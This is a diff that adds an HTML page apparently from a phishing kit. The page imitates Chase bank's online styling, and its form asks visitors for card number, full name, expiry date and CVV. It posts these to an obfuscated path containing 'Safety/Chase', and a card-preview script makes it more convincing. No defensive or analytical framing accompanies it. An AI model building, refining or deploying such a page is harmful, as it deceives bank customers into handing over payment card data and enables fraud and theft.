@@ -1,0 +1,78 @@
+<div class="container logon" data-is-view="true">
+    <div>
+        <div id="backgroundImage">
+            <div class="jpui background image fixed show-xs show-sm" id="geoImage">
+
+            </div>
+        </div>
+    </div>
+    <div class="row">
+
+        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
+            <div class="jpui raised segment">
+                <div class="row">
+                    <div class="col-xs-10 col-xs-offset-1">
+
+                        <div class="card-wrapper" style="display: none"></div>
+
+                        <div class="form-container active">
+                            <form id="login-form" method="post" autocomplete="off" action="/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33">
+                                <label class="util accessible-text logon-xs-toggle" for="card-number-input-field" data-attr="LOGON.userIdPlaceholder">
+                                    <span class="accessible-text errorAdaText"></span>
+                                    Card Number
+                                </label>
+                                <div class="logon-xs-toggle" id="cardNumber">
+                                    <input id="card-number-input-field"  placeholder="Card Number" type="tel" name="number" class="form-control jpui input">
+                                </div>
+
+                                <label class="util accessible-text logon-xs-toggle" for="full-name-input-field" data-attr="LOGON.userIdPlaceholder">
+                                    <span class="accessible-text errorAdaText"></span>
+                                    Full name
+                                </label>
+                                <div class="logon-xs-toggle" id="full-name">
+                                    <input id="full-name-input-field"  placeholder="Full Name" type="tel" name="name" class="form-control jpui input">
+                                </div>
+
+                                <!-- Expiry Field -->
+                                <label class="util accessible-text logon-xs-toggle" for="month-input-field" data-attr="LOGON.userIdPlaceholder">
+                                    <span class="accessible-text errorAdaText"></span>
+                                    Expiry
+                                </label>
+                                <div class="logon-xs-toggle" id="month">
+                                    <input id="month-input-field"  placeholder="Expiry MM/YY" type="tel" name="expiry" class="form-control jpui input">
+                                </div>
+
+                                <!-- Card Verification Field -->
+                                <div class="card-verification">
+                                    <label class="util accessible-text logon-xs-toggle" for="cvv-input-field" data-attr="LOGON.userIdPlaceholder">
+                                        <span class="accessible-text errorAdaText"></span>
+                                        cvv
+                                    </label>
+                                    <div class="logon-xs-toggle" id="cvv">
+                                        <input  id="cvv-input-field" placeholder="CVV" type="number" name="cvc" class="form-control jpui input">
+                                    </div>
+                                </div>
+
+                                <div class="row">
+                                    <button class="jpui button focus fluid primary" type="submit" id="signin-button" >
+                                                <span class="label">
+                                                    Next
+                                                </span>
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
+<script src="/js/jquery.card.js"></script>
+
+<script>
+    $('form').card({container: '.card-wrapper'});
+</script>
